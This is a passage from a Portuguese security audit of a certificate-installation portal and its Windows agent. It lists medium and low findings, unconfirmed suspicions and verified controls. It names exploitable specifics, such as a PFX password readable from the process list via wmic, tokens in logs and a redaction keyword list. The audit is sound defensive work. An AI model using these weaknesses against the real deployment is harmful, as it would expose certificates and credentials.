**Correção sugerida.** Em `verificar_ambiente()`, fatal se `INVENT_API_URL` não começar com `https://` em produção.

**Como testar.** Boot com `INVENT_API_URL=http://...` e `producao=True` → falha.

---

### #41 — Média — Comparação da `X-API-Key` não é de tempo constante

**Evidência.** `app/main.py:318` (`if x_api_key == config.API_KEY`). `/api/cron/alerts` usa `compare_digest` (`:2617`), mostrando que o padrão já existe no código.

**Correção sugerida.** `hmac.compare_digest(x_api_key.encode(), config.API_KEY.encode())`.

**Como testar.** Revisão; teste unitário que a função aceita/recusa continua igual.

---

### #42 — Média — Rotação do cofre: `V1` inalcançável, versões antigas aceitas sem recifrar, ajuda promete mais

**O que é.** `CERT_ENCRYPTION_KEY_V1` só é lida se `CURRENT_KEY_VERSION != 1`, mas a versão corrente é 1: a variável nunca é usada. Chaves antigas continuam válidas indefinidamente; `revalidar-cofre` só lê. O texto de ajuda do botão dá a entender que a revalidação corrige o cofre.

**Evidência.** `app/cert_installer.py:47,59-62`; `app/config.py:78-86`; `app/main.py:1107-1152`, `:5271`. Verificado OK: `key_version` vem da linha do banco, não do cliente; boot recusa chaves iguais (`config.py:203-210`).

**Correção sugerida.** Rota `recifrar-cofre` que reprocessa linhas com `key_version < CURRENT`; após zero linhas antigas, remover a chave antiga do ambiente; corrigir o texto de ajuda.

**Como testar.** Cofre com linhas v1 e v2 → após `recifrar-cofre`, `SELECT count(*) WHERE key_version < 2` = 0.

---

### #43 — Média — Senha do PFX na linha de comando do `certutil`

**Evidência.** `agent/installer_client.py:195-213`: `["certutil","-f","-user","-p", password or "", "-importpfx", ...]`. Sem `shell=True` (sem injeção de comando), mas a senha fica visível na tabela de processos (`wmic process get CommandLine`, Sysmon Event 1, EDR) para qualquer usuário local durante a execução.

**Correção sugerida.** `PFXImportCertStore` via `ctypes`/`pywin32` (senha em memória, flag `PKCS12_NO_PERSIST_KEY`/não exportável), ou `certutil -p` lendo de arquivo temporário com ACL restrita.

**Como testar.** Durante a instalação, `Get-CimInstance Win32_Process | ? Name -eq certutil.exe | select CommandLine` não deve conter a senha.

---

### #44 — Média — Agente grava o token de instalação inteiro no log

**Evidência.** `agent/installer_client.py:316`: `LOGGER.warning("Nenhum certificado retornado no bundle do token %s.", token)`. O token é de uso único e já consumido nesse ponto, o que reduz o impacto, mas o log do agente é legível por usuários locais.

**Correção sugerida.** Logar `token[:6] + "…"` ou o `token_id`.

**Como testar.** Provocar bundle vazio e conferir que o log não contém o token inteiro.

---

### #45 — Média — Instalador concede `users-modify` na pasta que guarda `maquina.dat`

**Evidência.** `agent_setup.iss:52`: pasta em `{commonappdata}` com permissão `users-modify`; ali fica `maquina.dat` (credencial de máquina).

**Correção sugerida.** Permissão só para SYSTEM e a conta do serviço; `users-readexec` no máximo.

**Como testar.** `icacls "C:\ProgramData\<app>"` não lista `BUILTIN\Users:(M)`.

---

### #46 — Média — API key guardada em `localStorage` sob a mesma chave do JWT

**Evidência.** `static/ui-common.js:12,28,42` (`cert_robot_api_key` guarda o JWT); `templates/configuracao.html:468-478,577-578` (a tela também grava a API key ali para o instalador). Confusão de credenciais: o JWT de 24 h e a chave de agente compartilhada moram no mesmo lugar, legível por XSS.

**Correção sugerida.** Não guardar a API key no navegador; gerar `agent_config.json` no servidor sob autorização admin e entregá-lo uma vez.

**Como testar.** Após configurar o agente, `localStorage` não contém valor que case com `config.API_KEY`.

---

### #47 — Média — Rate limit degrada para memória de instância sem sinalizar

**Evidência.** `app/taxa.py:108-116`: qualquer exceção do banco cai em `_permitir_em_memoria`, que num processo único é aceitável, mas a queda só aparece em log (e o `SecureJSONFormatter` pode apagar a mensagem, #57). Contar-depois-inserir sem transação (`:88-99`), corrida documentada.

**Correção sugerida.** Expor `"rate_limit_persistente": bool` em `/api/health` (versão admin, #48).

**Como testar.** Mock que faz `taxa` falhar → health reporta `false`.

---

### #48 — Baixa — `/api/health` público descreve a postura de segurança do deploy

**Evidência.** `app/main.py:1993-2030`: só booleanos, mas `api_key_required: false` diz a um anônimo que todas as rotas `/api/*` aceitam identidade anônima. **Correção.** `{"ok": true}` público; detalhe em `/api/health/detalhado` com `require_admin`. **Teste.** `GET /api/health` sem Authorization → corpo exatamente `{"ok": true}`.

### #49 — Baixa — CSP sem `base-uri`, `style-src 'unsafe-inline'`, relaxamento via `IMPECCABLE_LIVE`

**Evidência.** `app/main.py:642-664`. **Correção.** `base-uri 'none'`; mover estilos inline para classes (já em curso na migração Águia) e retirar `'unsafe-inline'`; garantir que `IMPECCABLE_LIVE` seja fatal em produção em `verificar_ambiente`. **Teste.** Cabeçalho CSP em produção contém `base-uri 'none'` e não contém `unsafe-inline`.

### #50 — Baixa — Remoção do cabeçalho `Server` é ineficaz no uvicorn

**Evidência.** `app/main.py:670-673` faz `del response.headers["server"]`, mas o uvicorn acrescenta `server: uvicorn` depois do middleware. **Correção.** `uvicorn --no-server-header` / `Config(server_header=False)`; ou remover no proxy. **Teste.** `curl -I` não devolve `server:`.

### #51 — Baixa — DSN do PostgreSQL sem `sslmode`

**Evidência.** `app/db_pg.py:515-525`; `app/config.py:187-188`. Banco local no mesmo servidor reduz o risco. **Correção.** `sslmode=require` quando o host não for `127.0.0.1`/`localhost`. **Teste.** Boot com `DATABASE_URL` remoto sem `sslmode` → aviso ou falha.

### #52 — Baixa — 409 ecoa o e-mail; importações distinguem "existe" de "criado"

**Evidência.** `app/main.py:1425-1432` (`f"Já existe uma conta com o e-mail {email}..."`), `:1371-1373`, `:4969-4982` (carteiras: linha "usuário não encontrado" por e-mail). Exige `usuarios:editar`/`carteiras:editar`, então não é enumeração anônima. **Correção.** Mensagem sem eco. **Teste.** `detail` do 409 não contém o endereço enviado.

### #53 — Baixa — `/api/mover-vencidos` devolve caminhos absolutos do servidor

**Evidência.** `app/main.py:4237-4239`. Admin-only. **Correção.** Devolver apenas nomes de arquivo e contagens. **Teste.** Resposta não contém `C:\` nem `/`.

### #54 — Baixa — `de`/`ate` sem validação; `busca` ignorada no export do histórico

**Evidência.** `app/main.py:4068` (datas livres), `:3166` (`_parse_iso_utc` devolve `datetime.min` em erro, sem 422), `:3960,3975` (`todas_filtradas` do histórico ignora `busca`, devolvendo mais do que a tela mostra). **Correção.** `Query(..., pattern=r"^\d{4}-\d{2}-\d{2}$")`; aplicar `busca` no export. **Teste.** `?de=abc` → 422; export com `busca=x` só devolve itens que casam.

### #55 — Baixa — AES-GCM sem dados associados (AAD)

**Evidência.** `app/cert_installer.py:99,126,194` (`encrypt(nonce, data, None)`). Um ciphertext de PFX pode ser trocado de linha (fingerprint/máquina) sem falhar a tag. **Correção.** AAD = `f"{machine_id}|{fingerprint}|{key_version}".encode()`. **Teste.** Trocar o ciphertext entre duas linhas → decifra falha.

### #56 — Baixa — Código de redefinição em SHA-256 sem sal

**Evidência.** `app/senha_reset.py:63-64`. Espaço de 10⁶ códigos; um dump da tabela permite tabela arco-íris trivial, mas a janela é 15 min e há queima no 3º erro. **Correção.** `hmac.new(JWT_SECRET_KEY, codigo, sha256)` ou sal por linha. **Teste.** Dois pedidos com o mesmo código geram hashes diferentes.

### #57 — Baixa — `SecureJSONFormatter` apaga a mensagem inteira e não redige `exc_info`

**Evidência.** `app/main.py:483-502`: mensagem com "token"/"senha"/"password" vira `*** REDACTED ***` inteira (apaga o WARNING de X-API-Key legado `:322-325` e o log de resgate recusado `cert_installer.py:1526`), mas o traceback de `exc_info` passa sem máscara. **Correção.** Regex que mascara valores (JWT, `token_urlsafe`), não frases; aplicar também a `record.exc_text`. **Teste.** Log com `"token abc.def.ghi rejeitado"` → `"token *** rejeitado"`.

### #58 — Baixa — Agente loga `file_name` (com senha) e `resp.text`

**Evidência.** `agent/installer_client.py:133-138,307,398`. Depende do #2; depois de tirar a senha do nome, resta o `resp.text` de erro. **Correção.** Logar `nome_publico` e `resp.status_code`. **Teste.** Log não contém `SENHA`.

### #59 — Baixa — Script de serviço sobe com `--reload`

**Evidência.** `scripts/servir.ps1:15`. Se for o script usado no servidor, o watcher de arquivos consome CPU e reinicia o processo a qualquer escrita. **Correção.** `--reload` só com parâmetro `-Dev`. **Teste.** Revisão do script de produção (`atualizar-portal.ps1` não está no repositório: não verificável).

### #60 — Baixa — `/redeem`, `/acompanhar`, `/revalidar-cofre` sem teto

**Evidência.** `app/main.py:5638` (sem o rate limit do gêmeo `/claim`), `:5488` (chamado em laço pela tela, agregação completa por chamada), `:5276` (decifra o cofre inteiro). **Correção.** Dependência `limitar(prefixo, max, janela)` por identidade. **Teste.** 4 POSTs a `/revalidar-cofre` em 10 min → o 4º é 429.

### #61 — Baixa — `/api/carteira/documentos` devolve o universo de clientes a qualquer líder

**Evidência.** `app/main.py:4734`, sem recorte por departamento (assumido em comentário). Registrar como risco aceito ou recortar. **Teste.** Líder de departamento X não recebe documentos que só constam em carteiras de Y.

### #62 — Baixa — Código morto que enfileira token; `GET /api/cron/alerts` muta estado; `/logs` sem consumidor

**Evidência.** `app/cert_installer.py:1893` (`enqueue_install_command`, só referenciado por teste; mantém viva a capacidade de injetar token na fila local); `app/main.py:2617,2665-2673` (GET que envia e-mails e expurga tabelas, imposto pelo Cron da Vercel, hoje pausada); `:5916` (`/logs` com `select("*")`, sem uso na UI). **Correção.** Remover os três, ou converter o cron para POST com o mesmo `CRON_SECRET`. **Teste.** `grep enqueue_install_command` só em testes → remover teste e função.

---

## 4. Suspeitas não confirmadas

- **Modo aberto em ambiente que não passe por `verificar_ambiente`.** Sem `API_KEY`, `require_auth` devolve identidade anônima com papel `agent` (`app/main.py:352-357,419-433`), que passa em `require_modulo` salvo `recusar_anonimo`. `verificar_ambiente` torna isso fatal em produção (`app/config.py:217-224`). A suspeita é que algum caminho de subida (script no servidor, serviço Windows) não execute a verificação. Não há evidência no repositório de que isso ocorra.
- **Blob `43779ce` fora do perímetro.** O commit `3175a05` foi feito para "preparar para Render" e o repositório tinha remoto no GitHub e deploys na Vercel/Render. É provável que o blob tenha chegado a esses serviços, mas o repositório não prova o que cada um retém.
- **Reuso de senhas entre SMTP, banco e portal.** O `.env` traz a senha do banco na `DATABASE_URL` e a senha SMTP cifrada em `portal_settings.json`; não foi comparado o valor de uma com a outra (regra de não copiar segredos). Suspeita de reuso pelo padrão do `API_KEY`.
- **`dist/` com cópia congelada de `app/`.** A varredura encontrou `dist/AnaliseCertiDigital_Agent_Service/_internal/app/` no disco. `git ls-files dist` devolve zero arquivos, então não está versionada; a suspeita é que builds antigos contenham código com o segredo de fallback removido em `39ecbac`. Fora do repositório.
- **Fallback secret antigo.** `default-certguard-fallback…` existiu em código (`5bc1b2f`, removido em `39ecbac`); hoje aparece só em docstring (`app/smtp_service.py:34`). Suspeita: dados cifrados naquela era com o fallback ainda existirem em `portal_settings.json` de algum ambiente.

## 5. Não verificável pelo código

- Terminação TLS em produção (Caddy/Let's Encrypt ou outro) e se há redirecionamento HTTP→HTTPS: nada versionado (#37).
- Valores reais de `API_KEY`, `JWT_SECRET_KEY`, chaves do cofre e `INVENT_API_URL` em produção; se coincidem com o `.env` local (#17, #40).
- Número de saltos de proxy em produção, necessário para corrigir o #6 corretamente.
- Estado real da matriz `permissoes` em produção (define se #9, #31, #32 são teóricos ou ativos).
- Se a `X-API-Key` compartilhada ainda está em uso e quantas estações migraram (alcance prático de #3 e #4). O WARNING em `app/main.py:322` foi feito para responder isso pelo log.
- Valor de `install_token_ttl_min` em `portal_settings` (janela do #22).
- Contas criadas por CSV e quantas estão com `deve_trocar_senha = false` (#10).
- Se `rate_limit_tentativas` tem o índice `(chave, quando)` aplicado na base viva.
- Se há WAF ou rate limit na borda.
- Se o portal roda em Windows (UNC/NTLM aplicável ao #16) e o egress do ambiente (se bloqueia faixas privadas, o #33 cai para Baixa).
- O lado INVENT: quem lá lê a fila que carrega o `token_raw` (#21).
- ACLs efetivas no servidor (`.env`, `data/`, pasta do agente) e nas estações (`agent_config.json`, `maquina.dat`).
- Row-Level Security no PostgreSQL: `db_pg` usa uma conexão de aplicação; se `DATABASE_URL` for de superusuário não há segunda linha de defesa.
- Retenção efetiva de `install_token` consumidos e do `install_log`.
- Assinatura de código dos executáveis do agente e do instalador.
- Se o certificado do achado #1 ainda está dentro da validade e se já foi revogado.
- Se o script de atualização do servidor (`atualizar-portal.ps1`, fora do repositório) usa `servir.ps1` com `--reload` (#59).

## 6. Itens verificados sem problema (por categoria)

**1 — Exposição de debug/dev.** `ENABLE_DOCS` desligado por padrão (`app/config.py:29-34`), `docs_url`/`redoc_url`/`openapi_url` = `None` (`app/main.py:612-620`), coberto por `tests/test_docs_desligados.py`. Sem `robots.txt`/`sitemap.xml`. Páginas HTML são cascas sem dado (`app/main.py:1011-1090,5174-5188,5998-6012`). Cabeçalhos: HSTS preload, `X-Frame-Options: DENY`, `nosniff`, COOP/CORP, `frame-ancestors 'none'`, `object-src 'none'` (`app/main.py:625-676`). Sem `CORSMiddleware` (same-origin). Fallback secret antigo não existe mais no código (`git grep` só acha a docstring em `app/smtp_service.py:34`).

**2 — Rate limit/DoS.** Tetos de paginação via `Query(le=...)` em todas as rotas paginadas (`app/main.py:3050,4017,4021,4071,4074,4737,5918,5928-5931,1919,5140,5155`); `busca` com `max_length`; `HISTORICO_LIMITE_SNAPSHOTS` com clamp (`app/config.py:51-56`) e cache (`:61-66`); upload de PFX com teto de 1 MB cedo (`app/main.py:4344-4345`); 50 certificados por token (`:4516,4535`); magic bytes nos imports (`:1298,4914-4917`); `app/taxa.py` inteiro (poda oportunista, fallback documentado); `Procfile` lido.

**3 — Contas, tokens e sessões.** `_sessao_do_token` relê `users` a cada requisição, papel do banco e não do JWT, 503 (não 401) em instabilidade (`app/main.py:193-255`); `deve_trocar_senha` imposto no servidor com allowlist fechada de uma rota (`:71,298-306`); `senha_trocar` exige a atual e recusa repetir (`:2503-2513`); JWT com `algorithms` fixo, `iss`/`aud`, `exp`/`nbf`/`iat`, segredo só do ambiente (`app/auth.py:38-42,90-112`); `PAPEIS_VALIDOS` num lugar só (`app/auth.py:16`); `_garantir_que_sobra_admin` falha fechada (`app/main.py:1478-1532`); dispositivos e máquinas com `token_urlsafe(32)`, sha256 + `compare_digest`, JWT de 60 min, 404 em vez de 403 (`app/agent_devices.py:113,140,144,220`; `app/machine_credentials.py:57,93,177`; `app/main.py:2856,2898,2918-2921,2967-2968`); `require_modulo` valida módulo e nível na importação (`app/main.py:414-417`); token de instalação com 256 bits, só hash no banco, compare-and-swap, TTL no servidor, nunca ao navegador, não vai em e-mail (`app/cert_installer.py:1462,1513-1524`; `app/main.py:5479-5482`); códigos de reset com `secrets.randbelow`, `compare_digest`, queima no 3º erro, escopo por `user_id` (`app/senha_reset.py:68-75,112-114,141,151-161,175,180-182,206-214`); recuperação com `RESPOSTA_GENERICA` em todos os desfechos (`app/main.py:2226,2334,2341,2352`).

**4 — `.env` e segredos no git.** `.env` nunca versionado (`git ls-files --error-unmatch .env` → não encontrado; `.gitignore:5,9` cobrem `.env` e `.env.*`); histórico só com placeholders; `.env.example` sem valores; chaves do cofre separadas e conferidas no boot (`app/config.py:192-210`); `templates/login.html` não embute segredos.

**5 — Entrada e path traversal.** Nenhum `open()`/`Path()`/`FileResponse` em rota com caminho vindo do corpo ou da query (só `/favicon.ico` constante); não existe rota de download por nome; upload de planilha com extensão, 5 MB, magic bytes, `openpyxl read_only`, sem gravação em disco (`app/main.py:4900-4921`); upload de PFX em memória (`:4327-4374`); caminhos enviados pelo agente em `/api/ingest` são gravados como texto e nunca abertos (`:4196-4197`); allowlist de `order` (`:847-864`), de `aba`; `parse_marcos` (`app/alertas_config.py:45-83`); `email_modelo.validar_campo` com lista fechada de marcadores.

**6 — SQL e prompt injection.** `app/db_pg.py` usa `psycopg.sql.Identifier` para colunas/tabelas (`_ident`, `:145-167`), `%s` parametrizado para valores (`:126-140`), `= ANY(%s)` em `in_`; nenhum f-string de valor em SQL; `_escape_ilike_pattern` (`app/main.py:3161`). Prompt injection: o repositório não tem integração com LLM; comentários, docstrings, docs e `CLAUDE.md`/`.impeccable` foram lidos e nenhum contém instrução dirigida a agente automatizado. Não se aplica.

**7 — XSS, CSV, cabeçalhos.** Jinja com autoescape; nonce em todos os `<script>`; `showToast` usa `textContent`; iframe de prévia com `sandbox`; `html.escape` no nome do e-mail (`app/main.py:2296`); CSP sem `unsafe-inline`/`unsafe-eval` em `script-src` (`:647-665`).

**8 — IDOR/BOLA.** `/prepare` → `_validar_pedido_de_instalacao` → `assegurar_carteira` (`app/main.py:5435`; `app/cert_installer.py:732-778`), `CarteiraIndisponivel` = 503; `tests/test_carteira.py` percorre o código; carteiras com `_exigir_alcance` em GET/POST/DELETE (`app/main.py:4775,4814,5021`) e `pode_gerir` linha a linha na importação (`:4973-4983`); `/acompanhar/{token_id}` filtra por `user_email` (`app/cert_installer.py:1571-1576`); vault opt-in POST/DELETE exigem `instalador: editar` + admin (`app/main.py:4442-4445,4470-4475`); `/api/permissoes/minhas` só o próprio papel (`:1969`); IDs UUID em toda parte (`db/001_users_base.sql:14`; `supabase/migrations/20260803_cert_installer.sql:32,37`; `app/command_queue.py:72`).

**9 — SSRF.** Só duas saídas HTTP do servidor, ambas com URL de `config.INVENT_API_URL` (variável de ambiente), nunca de entrada (`app/main.py:5369,5612`); sem webhooks, sem fonte de dados por URL, sem download remoto; link de redefinição usa `PORTAL_BASE_URL`, nunca `Host` (`:2288-2292`); senha SMTP com Fernet e chave dedicada obrigatória (`app/smtp_service.py:22-58`), verificada no boot (`app/main.py:537`), nunca devolvida (`_settings_dict` `:2033-2089` só `smtp_password_set`).

**10 — Segredos em repouso e cofre.** AES-256-GCM com nonce `os.urandom(12)` e tag; chaves só do ambiente; `key_version` da linha do banco, não do cliente; ECDH P-256 + HKDF + AES-GCM efêmero por resgate (`app/cert_installer.py:153-215`); bcrypt custo 12 sem hash legado (`app/auth.py:75`); `senha_em_claro` sem caminho de código que grave valor (`app/cert_installer.py:289` grava `None`); exportações CSV/PDF, e-mails de alerta, ponte INVENT e lista de custódia não carregam `file_name`.

**11 — Downgrade.** Sem autenticação por cookie (`grep set_cookie` → zero), logo sem CSRF clássico; `key_version` não controlável pelo cliente; sem `alg: none` (lista fixa); bcrypt sem hasher fraco alternativo; `/api/cron/alerts` com `compare_digest` e falha fechada 503 (`app/main.py:2617`).

**12 — Rotas e fila.** 79 rotas, todas em `app/main.py` (sem `APIRouter`); `/api/agent/commands` exige admin (`:2705`); allowlist fechada de comandos (`app/command_queue.py:16`, `frozenset` de 4 verbos), `ValueError` → 422 fora dela; o agente trata a string num `if/elif` de literais (`agent/run_agent.py:1112-1145`), sem `os.system`/`shell=True`/`eval`; os dois `subprocess.run` usam lista de argumentos (`run_agent.py:156`; `installer_client.py:195-205`); `require_agent_or_admin` recusa identidade anônima (`app/main.py:479-481`).

**13 — Enumeração.** Revogação de dispositivo alheio → 404 (`app/main.py:2918-2921`); resgate de token não distingue inexistente/expirado/consumido (`app/cert_installer.py:1522-1527`); `/api/senha/*` uniformes (ver categoria 3); cabeçalhos `Server`/`X-Powered-By`/`X-XSS-Protection` removidos no middleware (`app/main.py:670-675`, com a ressalva do #50).

**14 — Vazamento em erros.** `CarteiraIndisponivel`/`CustodiaIndisponivel` viram 503 com mensagem fixa, não 403 nem traceback (`app/main.py:4358-4374`; `app/cert_installer.py:732-778`); `SecureJSONFormatter` existe e mascara mensagens com token/senha (com as ressalvas do #57).

---

Fim da auditoria. Nenhuma correção foi iniciada.
